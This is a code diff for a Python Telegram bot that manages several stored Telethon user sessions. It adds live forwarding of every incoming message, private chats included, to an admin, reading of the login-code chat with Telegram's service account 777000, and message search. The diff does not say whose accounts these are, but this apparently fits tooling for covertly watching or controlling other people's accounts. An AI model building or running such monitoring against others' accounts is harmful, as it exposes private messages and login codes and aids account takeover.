@@ -1,7 +1,7 @@
 import os
 import sys
 import asyncio
-from telethon import TelegramClient
+from telethon import TelegramClient, events
 from aiogram import Bot, Dispatcher, types
 from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 from aiogram.filters import Command
@@ -19,6 +19,10 @@ if not os.path.exists("sessions"):
 # === Aiogram-бот ===
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
+
+# --- Глобальные состояния ---
+active_monitors = {}   # {session: client}
+search_state = {}      # {user_id: (session, chat_id)}
 
 # --- Утилиты ---
 def safe_filename(phone: str) -> str:
@@ -45,16 +49,28 @@ async def get_chats(session_name):
     return chats
 
 async def get_messages(session_name, chat_id):
-    client = TelegramClient(
-        f"sessions/{session_name}",
-        API_ID,
-        API_HASH
-    )
+    client = TelegramClient(f"sessions/{session_name}", API_ID, API_HASH)
     msgs = []
     async with client:
         async for msg in client.iter_messages(chat_id, limit=5):
-            msgs.append(f"{msg.sender_id}: {msg.text}")
+            if msg.text:
+                msgs.append(f"{msg.sender_id}: {msg.text}")
     return msgs
+
+# --- Онлайн-мониторинг ---
+async def start_monitoring(session):
+    client = TelegramClient(f"sessions/{session}", API_ID, API_HASH)
+    await client.start()
+
+    @client.on(events.NewMessage(incoming=True))
+    async def handler(event):
+        chat = await event.get_chat()
+        name = getattr(chat, "title", None) or getattr(chat, "first_name", "ЛС")
+        text = event.text or "📎 Медиа"
+        await bot.send_message(ADMIN_ID, f"📩 [{session}] {name}:\n{text}")
+
+    active_monitors[session] = client
+    await client.run_until_disconnected()
 
 # --- Главное меню ---
 def get_main_menu():
@@ -84,7 +100,7 @@ async def handle_callback(call: types.CallbackQuery):
     data = call.data.split(":")
     action = data[0]
 
-    # Выбор аккаунта → сразу список чатов
+    # Выбор аккаунта → меню аккаунта
     if action == "account":
         session = data[1]
         chats = await get_chats(session)
@@ -92,22 +108,66 @@ async def handle_callback(call: types.CallbackQuery):
             [InlineKeyboardButton(text=f"💬 {name}", callback_data=f"chat:{session}:{chat_id}")]
             for name, chat_id in chats
         ]
+        buttons.append([InlineKeyboardButton(text="💠 Telegram", callback_data=f"tgchat:{session}")])
+        buttons.append([InlineKeyboardButton(text="📡 Мониторинг", callback_data=f"monitor:{session}")])
         buttons.append([InlineKeyboardButton(text="🔙 Назад", callback_data="back")])
-        await call.message.answer(f"📂 Чаты аккаунта `{session}`:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
+        await call.message.answer(f"📂 Меню аккаунта `{session}`:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
 
     # Выбор чата → последние сообщения
     elif action == "chat":
         session, chat_id = data[1], int(data[2])
         msgs = await get_messages(session, chat_id)
         text = "\n".join(msgs) if msgs else "❌ Нет сообщений"
-        buttons = [[InlineKeyboardButton(text="🔙 Назад", callback_data=f"account:{session}")]]
+        buttons = [
+            [InlineKeyboardButton(text="🔍 Поиск", callback_data=f"search:{session}:{chat_id}")],
+            [InlineKeyboardButton(text="🔙 Назад", callback_data=f"account:{session}")]
+        ]
         await call.message.answer(f"💬 Сообщения:\n\n{text}", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
+
+    # Чат с Telegram (777000)
+    elif action == "tgchat":
+        session = data[1]
+        msgs = await get_messages(session, 777000)
+        text = "\n".join(msgs) if msgs else "❌ Нет сообщений"
+        buttons = [[InlineKeyboardButton(text="🔙 Назад", callback_data=f"account:{session}")]]
+        await call.message.answer(f"💠 Чат с Telegram:\n\n{text}", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
+
+    # Мониторинг
+    elif action == "monitor":
+        session = data[1]
+        if session in active_monitors:
+            await call.message.answer(f"⚡ Мониторинг `{session}` уже активен")
+        else:
+            asyncio.create_task(start_monitoring(session))
+            await call.message.answer(f"📡 Мониторинг `{session}` запущен")
+
+    # Поиск
+    elif action == "search":
+        session, chat_id = data[1], int(data[2])
+        search_state[call.from_user.id] = (session, chat_id)
+        await call.message.answer("🔍 Введи слово для поиска в этом чате:")
 
     elif action == "back":
         await call.message.answer("🔙 Главное меню:", reply_markup=get_main_menu())
 
     elif action == "add":
-        await call.message.answer("📲 Добавление аккаунта пока доступно только через консоль:\n\n`python3 main.py register`")
+        await call.message.answer("📲 Добавление аккаунта пока через консоль:\n\n`python3 main.py register`")
+
+# --- Обработка поиска ---
+@dp.message()
+async def handle_search(msg: types.Message):
+    if msg.from_user.id in search_state:
+        session, chat_id = search_state.pop(msg.from_user.id)
+        client = TelegramClient(f"sessions/{session}", API_ID, API_HASH)
+        results = []
+        async with client:
+            async for m in client.iter_messages(chat_id, limit=200):
+                if m.text and msg.text.lower() in m.text.lower():
+                    results.append(m.text)
+                    if len(results) >= 5:
+                        break
+        text = "\n\n".join(results) if results else "❌ Ничего не найдено"
+        await msg.answer(f"🔍 Результаты поиска:\n\n{text}")
 
 # --- Регистрация нового аккаунта ---
 async def register_account():
